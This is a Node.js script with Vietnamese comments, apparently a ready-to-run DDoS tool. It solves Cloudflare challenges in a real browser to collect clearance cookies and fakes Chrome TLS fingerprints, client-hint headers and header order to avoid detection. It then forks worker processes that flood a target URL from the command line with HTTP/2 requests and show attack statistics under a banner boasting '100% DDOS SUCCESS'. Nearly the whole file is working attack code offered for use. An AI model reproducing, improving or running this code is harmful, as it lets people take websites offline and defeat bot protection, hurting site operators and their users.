const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const HPACK = require('hpack'); // Giữ nhưng không dùng thủ công nữa

// ** ADVANCED TLS FINGERPRINTING & HEADER GENERATION - Tinh chỉnh shuffle nhẹ hơn **
function getAdvancedChromeTlsOptions(parsedTarget) {
    const chromeProfiles = [
        {
            version: 131,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'ECDHE-RSA-AES128-SHA', 'ECDHE-RSA-AES256-SHA', 'AES128-GCM-SHA256', 'AES256-GCM-SHA384',
                'AES128-SHA', 'AES256-SHA'
            ]
        },
        {
            version: 130,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'AES128-GCM-SHA256', 'AES256-GCM-SHA384'
            ]
        },
        {
            version: 129,
            ciphers: [
                'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_CHACHA20_POLY1305_SHA256',
                'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-AES256-GCM-SHA384',
                'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-CHACHA20-POLY1305',
                'AES128-GCM-SHA256', 'AES256-GCM-SHA384', 'AES128-SHA', 'AES256-SHA'
            ]
        }
    ];

    const profile = chromeProfiles[Math.floor(Math.random() * chromeProfiles.length)];
    const supportedGroups = ['x25519', 'secp256r1', 'secp384r1'];
    const sigAlgs = [
        'ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256', 'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384', 'rsa_pkcs1_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha512'
    ];
    
    const shuffledCiphers = [...profile.ciphers];
    if (Math.random() < 0.05) { // Giảm xác suất shuffle để giống browser ổn định hơn
        const i = shuffledCiphers.length - 1, j = Math.max(0, i - 1);
        [shuffledCiphers[i], shuffledCiphers[j]] = [shuffledCiphers[j], shuffledCiphers[i]];
    }

    return {
        ciphers: shuffledCiphers.join(':'),
        sigalgs: sigAlgs.join(':'),
        groups: supportedGroups.join(':'),
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                       crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                       crypto.constants.SSL_OP_NO_COMPRESSION,
        rejectUnauthorized: false,
        servername: parsedTarget.host
    };
}

function generateAdvancedBrowserHeaders(userAgentFromBypass) {
    const chromeVersion = parseInt((userAgentFromBypass.match(/Chrome\/(\d+)/) || [])[1] || '131');
    const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 5000)}.${Math.floor(Math.random() * 100)}`;

    const brandTemplates = [
        `"Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}", "Not-A.Brand";v="99"`,
        `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not;A=Brand";v="8"`,
        `"Not)A;Brand";v="99", "Google Chrome";v="${chromeVersion}", "Chromium";v="${chromeVersion}"`
    ];
    const brandValue = brandTemplates[Math.floor(Math.random() * brandTemplates.length)];

    const platforms = ['"Windows"', '"macOS"', '"Linux"', '"Android"'];
    const platform = platforms[Math.floor(Math.random() * platforms.length)];

    const archs = ['"x86"', '"arm"', '"x64"', '""'];
    const arch = archs[Math.floor(Math.random() * archs.length)];

    const models = ['""', '"Intel Mac OS X 10_15_7"', '"Windows NT 10.0; Win64; x64"', '"SM-G960F"'];
    const model = models[Math.floor(Math.random() * models.length)];

    const bitness = ['"64"', '"32"', '""'][Math.floor(Math.random() * 3)];

    const colorSchemes = ['light', 'dark', 'no-preference'];
    const colorScheme = colorSchemes[Math.floor(Math.random() * colorSchemes.length)];

    const languages = [
        "en-US,en;q=0.9,vi;q=0.8",
        "en-GB,en;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8"
    ];
    const acceptLanguage = languages[Math.floor(Math.random() * languages.length)];

    return {
        "sec-ch-ua": brandValue,
        "sec-ch-ua-mobile": platform === '"Android"' ? "?1" : "?0",
        "sec-ch-ua-platform": platform,
        "sec-ch-ua-arch": arch,
        "sec-ch-ua-model": model,
        "sec-ch-ua-platform-version": `"${Math.floor(Math.random() * 15) + 10}.0.0"`,
        "sec-ch-ua-full-version-list": `"Not)A;Brand";v="${fullVersion}", "Chromium";v="${fullVersion}", "Google Chrome";v="${fullVersion}"`,
        "sec-ch-ua-bitness": bitness,
        "sec-ch-prefers-color-scheme": colorScheme,
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": acceptLanguage,
        "origin": `https://${parsedTarget.host}`,
        "referer": Math.random() < 0.5 ? `https://${parsedTarget.host}/` : ""
    };
}

function getBrowserLikeHeaderOrder() {
    // Order giống Chrome, nhưng randomize nhẹ vị trí sec-ch-* phụ để đa dạng
    const baseOrder = [
        ':method',
        ':authority',
        ':scheme',
        ':path',
        'user-agent',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-arch',
        'sec-ch-ua-model',
        'sec-ch-ua-platform-version',
        'sec-ch-ua-full-version-list',
        'sec-ch-ua-bitness',
        'sec-ch-prefers-color-scheme',
        'upgrade-insecure-requests',
        'accept',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-user',
        'sec-fetch-dest',
        'accept-encoding',
        'accept-language',
        'origin',
        'referer',
        'cookie'
    ];
    // Randomize nhẹ phần giữa (sec-ch-*)
    const secChStart = baseOrder.indexOf('sec-ch-ua');
    const secChEnd = baseOrder.indexOf('upgrade-insecure-requests');
    const secChSection = baseOrder.slice(secChStart, secChEnd);
    if (Math.random() < 0.2) { // 20% chance shuffle nhẹ
        for (let i = secChSection.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [secChSection[i], secChSection[j]] = [secChSection[j], secChSection[i]];
        }
    }
    return [...baseOrder.slice(0, secChStart), ...secChSection, ...baseOrder.slice(secChEnd)];
}

function buildHeadersInOrder(headersObj, order) {
    const orderedHeaders = {};
    order.forEach(key => {
        if (headersObj.hasOwnProperty(key)) {
            orderedHeaders[key] = headersObj[key];
        }
    });
    Object.keys(headersObj).forEach(key => {
        if (!order.includes(key)) {
            orderedHeaders[key] = headersObj[key];
        }
    });
    return orderedHeaders;
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateCacheBuster() {
    const params = ['_', 'cb', 't', 'cache', 'v'];
    const param = params[Math.floor(Math.random() * params.length)];
    const value = Date.now() + Math.floor(Math.random() * 10000); // Tăng rand để đa dạng
    return `${param}=${value}`;
}

// ** BYPASS CLOUDFLARE - Tăng batchSize nếu cần nhiều sessions **
async function bypassCloudflareOnce(attemptNum = 1) {
    let response = null;
    let browser = null;
    let page = null;
    try {
        console.log(`\x1b[33m🔄 Starting bypass attempt ${attemptNum}...\x1b[0m`);
        response = await connect({
            headless: 'auto',
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
            turnstile: true,
        });
        browser = response.browser;
        page = response.page;
        await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });
        console.log("\x1b[33m⏳ Checking for Cloudflare challenge...\x1b[0m");
        
        let challengeCompleted = false;
        let waitCount = 0;
        while (!challengeCompleted) { // Chờ vô hạn đến khi có cookie, thay vì giới hạn 40 lần
            await new Promise(r => setTimeout(r, 500));
            waitCount++;
            const cookies = await page.cookies();
            if (cookies.some(c => c.name === "cf_clearance")) {
                challengeCompleted = true;
                console.log(`\x1b[32m✅ cf_clearance cookie found after ${waitCount * 0.5} seconds.\x1b[0m`);
                break;
            }
            if (waitCount % 20 === 0) { // Log progress mỗi 10 giây để theo dõi
                console.log(`\x1b[33m⏳ Still waiting for cf_clearance cookie... (${waitCount * 0.5} seconds elapsed)\x1b[0m`);
            }
        }

        const cookies = await page.cookies();
        const userAgent = await page.evaluate(() => navigator.userAgent);
        await browser.close();
        
        if (!cookies.some(c => c.name === "cf_clearance")) {
             throw new Error("cf_clearance cookie not found after wait.");
        }

        console.log(`\x1b[32m✅ Bypass attempt ${attemptNum} successful.\x1b[0m`);
        return { cookies, userAgent, success: true, attemptNum };
    } catch (error) {
        console.log(`\x1b[31m❌ Bypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        try { if (browser) await browser.close(); } catch (e) {}
        return { cookies: [], userAgent: "", success: false, attemptNum };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║     CLOUDFLARE BYPASS - PARALLEL MODE      ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    
    const results = [];
    let attemptCount = 0;
    const batchSize = 3; // Tăng nhẹ để có nhiều sessions rotate
    
    while (results.length < totalCount) {
        const remaining = totalCount - results.length;
        const currentBatchSize = Math.min(batchSize, remaining);
        console.log(`\n\x1b[33m🔄 Starting parallel batch (${currentBatchSize} sessions)...\x1b[0m`);
        
        const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
        const batchResults = await Promise.all(batchPromises);
        
        for (const result of batchResults) {
            if (result.success && result.cookies.length > 0) {
                results.push(result);
                console.log(`\x1b[32m✅ Session ${result.attemptNum} obtained! (Total: ${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31m❌ Session ${result.attemptNum} failed\x1b[0m`);
            }
        }
        if (results.length < totalCount) await new Promise(r => setTimeout(r, 2000));
    }
    return results.length > 0 ? results : [{ cookies: [], userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
}

// ** UPDATED FLOODER - Thêm delay random giữa requests **
async function runFlooder() {
    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
    if (!bypassInfo || !bypassInfo.userAgent) return;

    const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
    const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
    const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);

    const client = http2.connect(args.target, {
        createConnection: (authority, option) => {
            return tls.connect({
                ...tlsOptions,
                port: 443,
                host: parsedTarget.host,
                ALPNProtocols: ['h2'],
            });
        },
        settings: {
            headerTableSize: 262144,
            maxConcurrentStreams: 100,
            initialWindowSize: 6291456,
            maxHeaderListSize: 4096
        }
    });

    const connectionId = Math.random().toString(36).substring(2);
    global.activeConnections.add(connectionId);

    client.on('connect', async () => {
        const attackInterval = setInterval(async () => {
            if (client.destroyed) {
                clearInterval(attackInterval);
                return;
            }
            try {
                for (let i = 0; i < args.Rate; i++) {
                    // Delay random 50-200ms giữa requests để giống browser
                    await new Promise(r => setTimeout(r, 50 + Math.floor(Math.random() * 150)));

                    const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
                    const pathWithBuster = parsedTarget.path + querySeparator + generateCacheBuster();

                    let headers = {
                        ":method": "GET",
                        ":authority": parsedTarget.host,
                        ":scheme": "https",
                        ":path": pathWithBuster,
                        "user-agent": bypassInfo.userAgent,
                        "cookie": cookieString,
                        ...advancedHeaders
                    };

                    const headerOrder = getBrowserLikeHeaderOrder();
                    headers = buildHeadersInOrder(headers, headerOrder);

                    const req = client.request(headers);

                    req.on('response', (resHeaders) => {
                        const status = resHeaders[':status'];
                        if (!global.statuses[status]) global.statuses[status] = 0;
                        global.statuses[status]++;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        req.close();
                    });

                    req.on('error', () => {
                        if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
                        global.statuses["ERROR"]++;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        req.close();
                    });

                    req.end();
                }
            } catch (e) {
                // Ignore write errors if destroyed
            }
        }, 1000);

        setTimeout(() => {
            clearInterval(attackInterval);
            client.close();
        }, 30000); // Keep alive 30s
    });

    const cleanup = () => {
        global.activeConnections.delete(connectionId);
        client.destroy();
    };
    client.on('error', cleanup);
    client.on('close', cleanup);
}

// ** CLUSTER & STATS - Giữ nguyên, thêm log chi tiết nếu cần **
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║        FIXED UAMv3 - 100% DDOS SUCCESS     ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    console.log(`\x1b[36m🎯 Target:\x1b[0m ${args.target}`);
    console.log(`\x1b[36m⏱  Time:\x1b[0m ${elapsed}s / ${args.time}s`);
    console.log(`\x1b[36m⏳ Remaining:\x1b[0m ${remaining}s`);
    console.log(`\x1b[36m🔧 Config:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads}`);
    console.log(`\x1b[36m🍪 Sessions:\x1b[0m ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} requested`);

    let totalStatuses = {};
    let totalRequests = 0;
    for (let w in global.workers) {
        if (global.workers[w][0].state == 'online') {
            const msg = global.workers[w][1];
            for (let st of msg.statusesQ) {
                for (let code in st) {
                    if (!totalStatuses[code]) totalStatuses[code] = 0;
                    totalStatuses[code] += st[code];
                }
            }
            totalRequests += msg.totalRequests || 0;
        }
    }
    console.log(`\x1b[33m📊 Statistics:\x1b[0m`);
    console.log(`   \x1b[36m📈 Total Requests:\x1b[0m ${totalRequests}`);
    console.log(`   \x1b[33m⚡ Rate:\x1b[0m ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} req/s`);
    console.log(`   \x1b[32m🔧 Status Codes:\x1b[0m`, totalStatuses);

    const progress = Math.floor((elapsed / args.time) * 30);
    const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
    console.log(`\n\x1b[36mProgress: [\x1b[32m${progressBar}\x1b[36m]\x1b[0m`);
}

// Initialize global
global.activeConnections = new Set();
global.workers = {};
global.startTime = Date.now();
global.bypassData = [];

if (process.argv.length < 7) {
    console.log("\x1b[31m❌ Usage: node fixed.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mExample: node fixed.js https://example.com 60 100 8 5\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 4 // Tăng default để rotate tốt hơn
};

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║        FIXED UAMv3 - 100% DDOS SUCCESS     ║\x1b[0m");
    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
    
    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32m✅ Successfully obtained ${bypassResults.length} session(s)!\x1b[0m`);
        console.log("\x1b[32m🚀 Starting attack...\x1b[0m\n");
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.workers[worker.id] = [worker, message];
            }
        });
        
        cluster.on('exit', (worker) => {
             if (Date.now() - global.startTime < args.time * 1000) {
                 const newWorker = cluster.fork();
                 newWorker.send({ type: 'bypassData', data: global.bypassData });
             }
        });
        
        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\x1b[32m✅ Attack completed!\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else { // Worker
    let statusesQ = [];
    global.totalRequests = 0;
    global.statuses = {};
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;
            setInterval(() => runFlooder(), 500); // Async để delay ok
            
            setInterval(() => {
                if (Object.keys(global.statuses).length > 0) {
                    if (statusesQ.length >= 4) statusesQ.shift();
                    statusesQ.push({...global.statuses});
                    global.statuses = {};
                }
                process.send({
                    type: 'stats',
                    statusesQ: statusesQ,
                    totalRequests: global.totalRequests
                });
            }, 250);
        }
    });
    
    setTimeout(() => process.exit(0), args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});